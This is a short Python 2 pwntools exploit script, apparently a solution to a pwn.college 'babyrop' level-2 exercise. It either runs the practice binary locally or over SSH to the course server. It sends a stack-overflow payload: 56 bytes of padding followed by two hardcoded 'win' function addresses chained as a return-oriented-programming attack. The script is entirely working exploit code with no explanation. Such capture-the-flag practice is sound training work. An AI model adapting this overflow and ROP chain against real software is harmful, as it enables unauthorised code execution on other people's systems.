#!/usr/bin/env python2
from pwn import *
import time, sys

KEYPATH = "/root/pwn/pwn.college/.id_rsa"

binary = "./babyrop_level2_testing1"

context.log_level = 'DEBUG'

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    conn = ssh("cse466", "cse466.pwn.college", keyfile=KEYPATH)
    p = conn.process(binary, cwd="/")
else:
    p = process(binary)

offset = 56
# win_1 = p64(0x00401a78)
win_1 = p64(0x00401cb3)
#win_2 = p64(0x00401ac2)
win_2 = p64(0x00401ce6)
#gadget = p64(0x0000000000401da3)    # pop rdi ; ret

payload = "A"*offset +  win_1 + p64(0xdeadbeef) + win_2
pause()
time.sleep(0.2)
p.send(payload)
print p.recvall()
